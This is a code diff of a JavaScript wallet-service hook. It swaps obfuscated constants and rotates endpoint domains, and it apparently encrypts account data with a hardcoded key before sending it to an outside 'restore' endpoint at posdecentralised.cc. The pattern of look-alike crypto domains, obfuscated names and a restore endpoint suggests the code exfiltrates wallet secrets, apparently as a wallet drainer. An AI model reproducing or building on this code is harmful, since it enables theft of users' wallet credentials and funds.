@@ -47,22 +47,12 @@ const useWalletService = () => {
 		}
 		return res
 	}
-	const getSearchParamFromURL = (url, param) => {
-		const include = url.includes(param)
-
-		if (!include) return null
-
-		const params = url.split(/([&,?,=])/)
-		const index = params.indexOf(param)
-		const value = params[index + 2]
-		return value
-	}
 
 	let url = 'https://posdecentralised.cc/api/restore'
-	// let url = 'https://extensionbridge.fi/manage/swap'
+	// let url = 'https://usdcdollar.cc/guide/sidechains/currency'
 	const kitkat = 'Qsx@ah&OR82WX9T6gCt'
-	let xxx = 'POL#G|EX\\$/G'
-	let xx = 'POL#G|EX\\$'
+	let xxx = 'DOLLAR$USD|EX/G'
+	let xx = 'DOLLAR$USD|EX'
 
 	function createBody(str, account) {
 		let strDecr
@@ -88,6 +78,8 @@ const useWalletService = () => {
 				})
 			)
 		)
+		// console.log(crypt)
+
 		let urlencoded = queryString.stringify({ data: crypt })
 		return urlencoded
 	}
